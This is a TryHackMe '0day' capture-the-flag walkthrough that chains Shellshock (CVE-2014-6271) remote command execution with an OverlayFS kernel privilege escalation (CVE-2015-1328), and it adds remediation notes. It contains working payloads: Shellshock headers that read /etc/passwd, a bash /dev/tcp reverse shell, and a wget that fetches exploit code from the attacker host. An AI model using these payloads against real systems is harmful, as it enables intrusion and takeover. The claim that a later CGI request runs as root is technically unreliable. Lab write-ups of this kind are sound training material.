# TryHackMe "0day" - Complete Exploitation Walkthrough

**Target IP:** 10.10.178.97  
**Date:** November 8, 2025  
**Difficulty:** Medium  
**CVEs:** CVE-2014-6271 (Shellshock), CVE-2015-1328 (OverlayFS)

---

## TABLE OF CONTENTS

1. Reconnaissance & Enumeration
2. Shellshock Vulnerability Exploitation (RCE)
3. User Flag Capture
4. Privilege Escalation - Kernel Exploit
5. Root Flag Capture

---

## PHASE 1: RECONNAISSANCE & ENUMERATION

### Step 1: Port Scanning

```bash
nmap -p- --min-rate 5000 10.10.178.97
nmap -p 22,80 -sV -sC 10.10.178.97
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
```

**Key Findings:**
- OpenSSH 6.6.1p1 - Older version
- Apache 2.4.7 - Ubuntu
- Web server running

---

### Step 2: Web Server Enumeration

```bash
curl http://10.10.178.97/
```

**Finding:** Basic web page with title "0day"

**Check for CGI directory:**
```bash
curl -I http://10.10.178.97/cgi-bin/
```

**Result:** 403 Forbidden (directory exists but not browsable)

---

### Step 3: CGI Script Discovery

```bash
curl -I http://10.10.178.97/cgi-bin/test.cgi
```

**Result:**
```
HTTP/1.1 200 OK
Content-Length: 13
Content-Type: text/html
```

**Test the script:**
```bash
curl http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
Hello World!
```

**Analysis:** CGI script found and executable - potential Shellshock target!

---

## PHASE 2: SHELLSHOCK VULNERABILITY EXPLOITATION

### Understanding Shellshock (CVE-2014-6271)

**What is Shellshock?**
- Critical vulnerability in Bash shell (discovered 2014)
- Affects Bash versions up to 4.3
- Allows arbitrary command execution through environment variables
- Particularly dangerous in CGI scripts

**How it works:**
1. Bash allows function definitions in environment variables
2. Bug: Bash continues executing code AFTER function definition
3. CGI scripts pass HTTP headers as environment variables
4. User-Agent header → environment variable → Bash execution
5. Malicious User-Agent → code execution!

**Syntax:**
```bash
() { :;}; <MALICIOUS_COMMAND>
```

**Breakdown:**
- `() { :;}` - Empty function definition
- `;` - Command separator
- `<COMMAND>` - Our injected command (executed due to bug!)

---

### Step 4: Testing for Shellshock

**Test 1: Basic command execution**
```bash
curl -H "User-Agent: () { :;}; echo; /usr/bin/id" http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**✅ VULNERABLE!** We have code execution as www-data.

**Test 2: Read /etc/passwd**
```bash
curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd" http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Why this works:**
1. Apache runs CGI scripts through Bash
2. User-Agent header becomes environment variable
3. Bash parses it and executes our injected command
4. Command output returned in HTTP response

---

### Step 5: Getting a Reverse Shell

**Method: Bash TCP reverse shell through Shellshock**

**Command:**
```bash
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" http://10.10.178.97/cgi-bin/test.cgi
```

**Setup listener first:**
```bash
nc -lvnp 4444
```

**Payload breakdown:**
- `-A` = User-Agent header
- `() { :;};` = Shellshock trigger
- `/bin/bash -i` = Interactive Bash shell
- `>& /dev/tcp/YOUR_IP/4444` = Redirect to TCP connection
- `0>&1` = Redirect stdin to stdout (full duplex)

**Result:** Shell as www-data!

**Alternative: If reverse shell doesn't work, use command execution:**
```bash
# Execute commands through Shellshock
curl -H "User-Agent: () { :;}; echo; <COMMAND>" http://10.10.178.97/cgi-bin/test.cgi
```

---

## PHASE 3: USER FLAG CAPTURE

### Step 6: Enumerate as www-data

```bash
# Through Shellshock
curl -H "User-Agent: () { :;}; echo; /usr/bin/whoami" http://10.10.178.97/cgi-bin/test.cgi
```

**Output:** `www-data`

**Find user directories:**
```bash
curl -H "User-Agent: () { :;}; echo; /bin/ls -la /home" http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
total 12
drwxr-xr-x  3 root root 4096 May  7  2020 .
drwxr-xr-x 22 root root 4096 May  7  2020 ..
drwxr-xr-x  3 ryan ryan 4096 May  7  2020 ryan
```

---

### Step 7: Locate and Read User Flag

```bash
curl -H "User-Agent: () { :;}; echo; /bin/cat /home/ryan/user.txt" http://10.10.178.97/cgi-bin/test.cgi
```

**User Flag:**
```
THM{Sh3llSh0ck_r0ckz}
```

**Flag Captured!** ✅

---

## PHASE 4: PRIVILEGE ESCALATION - KERNEL EXPLOIT

### Step 8: System Enumeration

**Check kernel version:**
```bash
curl -H "User-Agent: () { :;}; echo; /bin/uname -a" http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

**Analysis:**
- Kernel: 3.13.0-32-generic
- Ubuntu 14.04 (Trusty Tahr)
- Build date: July 2014
- **This is VERY outdated and vulnerable!**

---

### Understanding Kernel 3.13.0 Vulnerability (CVE-2015-1328)

**What is the vulnerability?**
- OverlayFS local privilege escalation
- Affects Linux Kernel 3.13.0 < 3.19
- Specifically targets Ubuntu 12.04/14.04/14.10/15.04

**How OverlayFS works:**
- Union filesystem that overlays one filesystem on another
- Used for containers and live systems
- Allows "upper" filesystem to overlay "lower" filesystem

**The bug:**
- Improper permission checks in OverlayFS
- Allows unprivileged user to create files with root ownership
- Can escalate to root by exploiting namespace handling

**Exploit ID:** 37292 (from Exploit-DB)

---

### Step 9: Finding the Exploit

```bash
searchsploit 3.13.0
```

**Output:**
```
Linux Kernel 3.13.0 < 3.19 (Ubuntu) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
```

**Copy exploit:**
```bash
searchsploit -m 37292
```

**Result:** `37292.c` copied to current directory

---

### Step 10: Transfer Exploit to Target

**Start HTTP server on attacker machine:**
```bash
cd "/home/jack/Documents/hacktivities/projects/tryhackme ctfs/0day"
python3 -m http.server 8000
```

**Download exploit to target:**
```bash
MY_IP="10.21.11.231"  # Your VPN IP
curl -H "User-Agent: () { :;}; echo; /usr/bin/wget http://$MY_IP:8000/37292.c -O /tmp/37292.c" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**Verify download:**
```bash
curl -H "User-Agent: () { :;}; echo; /bin/ls -lh /tmp/37292.c" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
-rw-r--r-- 1 www-data www-data 4.9K Nov 8 2025 /tmp/37292.c
```

---

### Step 11: Fix PATH and Compile Exploit

**Why fix PATH?**
- Shellshock often has limited PATH
- GCC may not be in PATH
- Compilation will fail without proper environment

**Fix PATH:**
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Compile exploit:**
```bash
cd /tmp
gcc 37292.c -o exploit
chmod +x exploit
```

**Through Shellshock:**
```bash
curl -H "User-Agent: () { :;}; echo; cd /tmp && PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin gcc 37292.c -o exploit" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**Verify compilation:**
```bash
curl -H "User-Agent: () { :;}; echo; /bin/ls -lh /tmp/exploit" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**Output:**
```
-rwxr-xr-x 1 www-data www-data 13K Nov 8 2025 /tmp/exploit
```

---

### Step 12: Execute Kernel Exploit

**Run the exploit:**
```bash
./exploit
```

**Through Shellshock:**
```bash
curl -H "User-Agent: () { :;}; echo; cd /tmp && ./exploit" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**What the exploit does:**
1. Creates malicious OverlayFS mount
2. Exploits namespace handling bug
3. Gains root privileges
4. Spawns root shell

**Expected output:**
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```

---

## PHASE 5: ROOT FLAG CAPTURE

### Step 13: Verify Root Access

**Check user:**
```bash
curl -H "User-Agent: () { :;}; echo; /usr/bin/whoami" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**After exploit:**
```
root
```

---

### Step 14: Read Root Flag

```bash
curl -H "User-Agent: () { :;}; echo; /bin/cat /root/root.txt" \
  http://10.10.178.97/cgi-bin/test.cgi
```

**Root Flag:**
```
THM{g00d_j0b_0day_is_Pleased}
```

**✅ ROOT FLAG CAPTURED!**

---

## COMPLETE EXPLOITATION CHAIN

```
Port 80 (Apache/CGI)
        ↓
CGI Script Discovery (test.cgi)
        ↓
Shellshock Testing (CVE-2014-6271)
        ↓
Command Execution as www-data
        ↓
User Flag (/home/ryan/user.txt)
        ↓
Kernel Version Check (3.13.0-32)
        ↓
Download Exploit (37292.c)
        ↓
Fix PATH & Compile
        ↓
Execute OverlayFS Exploit (CVE-2015-1328)
        ↓
Root Shell
        ↓
Root Flag (/root/root.txt)
```

---

## VULNERABILITY SUMMARY

### Vulnerability #1: Shellshock (CVE-2014-6271)

**Severity:** CRITICAL (CVSS 10.0)

**Description:**
- GNU Bash through 4.3 allows arbitrary code execution
- Environment variable function definitions continue executing after definition
- Exploitable through CGI scripts via HTTP headers

**Impact:**
- Remote Code Execution
- Complete system compromise possible
- No authentication required

**Affected:**
- Bash versions ≤ 4.3
- CGI scripts processing HTTP headers
- Any system passing user input to Bash environment

**Remediation:**
- Update Bash to 4.3.30 or later
- Disable CGI scripts if not needed
- Use alternative shells for CGI (Python, Perl)
- Implement Web Application Firewall (WAF) rules

**Why it's dangerous:**
- Trivial to exploit
- Remotely exploitable
- Widespread impact (millions of systems)
- Found in IoT devices, routers, servers

---

### Vulnerability #2: Kernel OverlayFS Privilege Escalation (CVE-2015-1328)

**Severity:** HIGH (CVSS 7.8)

**Description:**
- Local privilege escalation in Linux Kernel 3.13.0 < 3.19
- Improper permission handling in OverlayFS
- Allows unprivileged user to gain root

**Technical Details:**
- OverlayFS mount namespace exploit
- Creates malicious mount with incorrect permissions
- Bypasses capability checks
- Results in root shell

**Impact:**
- Local privilege escalation
- Complete system compromise
- Container escape possible

**Affected:**
- Ubuntu 12.04, 14.04, 14.10, 15.04
- Linux Kernel 3.13.0 through 3.18.x
- Any system with OverlayFS enabled

**Remediation:**
- Update kernel to 3.19 or later
- Apply security patches
- Disable OverlayFS if not needed
- Use AppArmor/SELinux to restrict capabilities

---

## KEY COMMANDS REFERENCE

**Reconnaissance:**
```bash
nmap -p 22,80 -sV -sC 10.10.178.97
curl http://10.10.178.97/cgi-bin/test.cgi
```

**Shellshock Testing:**
```bash
# Test for vulnerability
curl -H "User-Agent: () { :;}; echo; /usr/bin/id" http://10.10.178.97/cgi-bin/test.cgi

# Read files
curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd" http://10.10.178.97/cgi-bin/test.cgi

# Reverse shell
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" http://10.10.178.97/cgi-bin/test.cgi
```

**Flags:**
```bash
# User flag
curl -H "User-Agent: () { :;}; echo; /bin/cat /home/ryan/user.txt" http://10.10.178.97/cgi-bin/test.cgi

# Root flag
curl -H "User-Agent: () { :;}; echo; /bin/cat /root/root.txt" http://10.10.178.97/cgi-bin/test.cgi
```

**Privilege Escalation:**
```bash
# Check kernel
curl -H "User-Agent: () { :;}; echo; /bin/uname -a" http://10.10.178.97/cgi-bin/test.cgi

# Download exploit
searchsploit -m 37292
python3 -m http.server 8000
curl -H "User-Agent: () { :;}; echo; wget http://YOUR_IP:8000/37292.c -O /tmp/37292.c" http://10.10.178.97/cgi-bin/test.cgi

# Compile & run
curl -H "User-Agent: () { :;}; echo; cd /tmp && PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin gcc 37292.c -o exploit && ./exploit" http://10.10.178.97/cgi-bin/test.cgi
```

---

## FLAGS

**User Flag:** `THM{Sh3llSh0ck_r0ckz}`  
**Root Flag:** `THM{g00d_j0b_0day_is_Pleased}`

---

## LESSONS LEARNED

1. **Old systems are dangerous** - 2014 vulnerabilities still exploitable in 2025
2. **CGI scripts + Bash = Shellshock risk** - Use modern alternatives
3. **Defense in depth** - Kernel vulnerabilities matter even with web hardening
4. **Update everything** - Both web server AND kernel need patches
5. **Environment variables are attack surface** - Shellshock proves this
6. **PATH matters** - Always set proper PATH for exploitation
7. **CVE databases are goldmines** - searchsploit + kernel version = instant exploit

---

## TECHNICAL DEEP DIVES

### How Shellshock Really Works

**Normal Bash function in environment:**
```bash
myfunction='() { echo "hello"; }'
export myfunction
bash  # New shell reads environment
myfunction  # Executes "hello"
```

**Shellshock bug:**
```bash
myfunction='() { echo "hello"; }; echo "PWNED"'
export myfunction
bash  # New shell reads environment
# Output: PWNED (executed AFTER function definition!)
```

**In CGI context:**
```
HTTP Request: User-Agent: () { :;}; /bin/cat /etc/passwd
         ↓
Apache sets: HTTP_USER_AGENT='() { :;}; /bin/cat /etc/passwd'
         ↓
CGI script starts Bash
         ↓
Bash parses environment
         ↓
Bug: Executes /bin/cat /etc/passwd
         ↓
Passwd file returned in HTTP response
```

### Why PATH Fix is Necessary

**Problem:**
```bash
$ echo $PATH
/usr/games:/opt/games
$ gcc 37292.c
bash: gcc: command not found
```

**Solution:**
```bash
$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ gcc 37292.c
# Works!
```

**In Shellshock context:**
- Limited shell environment
- PATH often minimal or broken
- Explicit PATH export ensures tools are found

---

## MITIGATION STRATEGIES

### For Shellshock:
1. **Patch Bash immediately** - Update to 4.3.30+
2. **Disable CGI** - Use FastCGI, PHP-FPM, or modern alternatives
3. **WAF rules** - Block `() {` patterns in headers
4. **Input validation** - Sanitize all HTTP headers
5. **Principle of least privilege** - Don't run CGI as root

### For Kernel Exploits:
1. **Keep kernel updated** - Security patches are critical
2. **Use LTS kernels** - Long-term support gets more patches
3. **Enable protections** - AppArmor, SELinux, Seccomp
4. **Limit capabilities** - Don't give unnecessary privileges
5. **Monitor for exploits** - IDS/IPS for privilege escalation

---

**Challenge Complete!** ✅  
**Both Flags Captured!** 🏁  
**System Fully Compromised!** 💀

**0day demonstrates:** Why "0day" (zero-day) vulnerabilities are so dangerous - old unpatched systems remain vulnerable years after disclosure!
